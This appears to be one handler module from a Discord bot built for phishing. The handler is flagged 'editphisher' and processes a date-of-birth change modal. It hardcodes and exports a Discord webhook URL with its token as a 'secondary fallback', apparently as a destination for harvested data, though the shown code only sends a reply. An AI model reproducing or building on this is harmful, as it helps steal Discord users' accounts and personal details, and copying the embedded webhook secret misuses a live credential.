const SECONDARY_FALLBACK_WEBHOOK_URL = "https://discord.com/api/webhooks/1431757761116635188/kIkgO6QBqlBdWfo2Ttvpijl5BXJCgzbUeetBgr5ewKc4AM4jzn1aKyBIm4Hg6TXQkF6h";

module.exports = {
  name: "changedobmodal",
  editphisher: true,
  callback: async (client, interaction) => {
    try {
      await interaction.reply({ content: "Date of birth change handled.", ephemeral: true });
    } catch (error) {
    }
  },

  SECONDARY_FALLBACK_WEBHOOK_URL: SECONDARY_FALLBACK_WEBHOOK_URL,
};